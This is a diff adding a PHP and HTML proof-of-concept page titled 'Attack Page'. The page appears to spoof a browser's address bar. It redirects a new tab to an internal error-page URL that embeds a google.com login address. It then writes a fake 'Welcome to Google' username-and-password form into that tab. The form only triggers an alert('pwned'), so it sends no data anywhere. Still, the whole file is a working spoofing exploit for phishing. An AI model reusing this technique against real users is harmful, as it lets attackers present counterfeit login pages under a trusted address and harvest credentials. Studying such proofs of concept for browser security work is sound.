@@ -1,0 +1,48 @@
+<?php
+// Check if "redirect" parameter is present in the URL
+if (isset($_GET['redirect'])) {
+
+
+    // Perform the server-side redirect
+    header("Location: internal://local/errorpage?url=https://www.google.com/login&code=0&domain=&description=Redirection%20to%20URL%20with%20a%20scheme%20that%20is%20not%20HTTP(S)&timestamp=1732440620327");
+    exit;
+}
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Attack Page</title>
+    <script>
+        // Open the new tab when the button is clicked
+        function openTab() {
+            const newTab = window.open('ff.php?redirect', '_blank');
+
+            // Wait for the new tab to load and change its content
+            setTimeout(() => {
+                if (newTab) {
+                    newTab.document.write(`
+                        <html>
+                            <head><title>Fake Login</title></head>
+                            <body>
+                                <h1>Welcome to Google</h1>
+                                <form action="javascript:alert('pwned')">
+                                    <label for="username">Username:</label>
+                                    <input type="text" id="username" name="username"><br><br>
+                                    <label for="password">Password:</label>
+                                    <input type="password" id="password" name="password"><br><br>
+                                    <button type="submit">Login</button>
+                                </form>
+                            </body>
+                        </html>
+                    `);
+                }
+            }, 1000); // Give time for the tab to load
+        }
+    </script>
+</head>
+<body ;>
+    <h1 style=font-size:60px>Click the button below</h1>
+    <button style=font-size:60px onclick="openTab()">Go to Google.com</button>
+</body>
+</html>
